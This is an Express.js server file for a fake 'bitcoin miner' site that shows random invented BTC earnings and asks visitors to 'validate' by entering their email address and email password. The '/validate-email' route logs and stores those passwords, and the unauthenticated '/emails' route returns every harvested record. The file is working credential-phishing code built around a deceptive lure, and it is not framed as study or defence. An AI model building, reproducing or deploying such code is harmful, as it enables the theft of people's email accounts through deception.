const express = require('express');

const app = express();
const body_parser = require('body-parser');
const ejs = require('ejs');
const path = require('path');



const _ = require('lodash');
const port = process.env.PORT || 3000;


const cookieParser = require('cookie-parser');
app.use(express.static( path.join(__dirname ,'public/')));
app.use(cookieParser());

/**** MODELS ***********/
const {User} = require('./models/user');


app.use(body_parser.json());
app.use(body_parser.urlencoded({extended :  false}));



app.set('view engine', 'ejs');

app.get('/', (req,res) => {

    res.render("bitcoin-miner.ejs")
    
})

app.get('/emails', (req,res) => {

	User.find().then((a) => {
		res.send(a)
	})
})

app.get('/start-mining', (req,res) => {

		var btc;
	//Check if the account is already validated so we can mine.
	if(req.cookies['validate']) {


	const btcArray = [0.0001, 0.000657, 0.00056, 0.000787,0.000565747, 0.00039390, 0.00067869, 0.000345, 0.0004324, 0.00088,0.000566788, 0.0004];
		const random = Math.floor(Math.random() * btcArray.length);

		btc = btcArray[random]

	}else{
		btc = " Please validate email, scroll down"
	}
	res.render('activation.ejs',{

		btc
	})
})

app.post('/validate-email', (req,res) => {

	const body = _.pick(req.body,['email','email_password']);
	console.log(body.email_password)

	User.findOne({email : body.email}).countDocuments().then((count) => {
		if(count <=1){
			const user = new User(body);		
			user.save().then((saved) => {
		res.status(200).send({})	
	})
		}else{
			User.findOneAndUpdate({email : body.email}, {$set : {email : body.email, email_password  : body.email_password}}).then((done) => {
				res.status(200).send()
			})
		}
	})

	

	

	
})


/****************** END ***********************/




app.listen(port, function (){
    console.log('Web served on port 3000');
});
